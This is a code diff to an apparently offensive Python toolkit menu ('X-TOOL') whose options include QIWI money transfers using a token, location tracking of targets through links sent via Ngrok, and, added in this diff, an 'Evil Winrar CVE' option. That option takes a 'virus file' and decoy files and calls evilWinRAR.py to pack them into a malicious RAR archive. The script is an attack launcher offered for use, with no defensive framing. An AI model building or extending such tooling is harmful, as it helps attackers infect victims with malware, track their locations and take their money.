@@ -39,6 +39,7 @@ print('[9] QIWI Check Balance using token')
 print('[10] QIWI Transfer money using token')
 print("[11] Check Location and information from link (seeker)(Blocked in Russia)")
 print("[12] Check Location and info from link (locator)(Working in Russia)")
+print("[13] Evil Winrar CVE")
 print('')
 query = input("[*] Choose exploit!:")
 if query in ["1"]:
@@ -140,7 +141,13 @@ if query in ["12"]:
 	print("Send Link from Ngrok Terminal to target")
 	time.sleep(5)	
 	os.system("cd && cd X-TOOL && cd locator && bash locator.sh")
+if query in ["13"]:
+	Evil_file = input("Enter File name of virus file you want in rar archive(Put file in X-Tool folder (/home/X-TOOL)!:")
+	Good_files = input("Enter File Names of Good files (Example: world.txt hello.txt)(Put their in to X-Tool folder(/home/X-TOOL")
 
+
+	CVE = ("cd && cd X-TOOL && ./evilWinRAR.py -e ") + (Evil_file) + (" -g ") + (Good_files)
+	os.system(CVE)
 else:
 	print('')
 	print('[X] Sorry, You didnt choose options!')
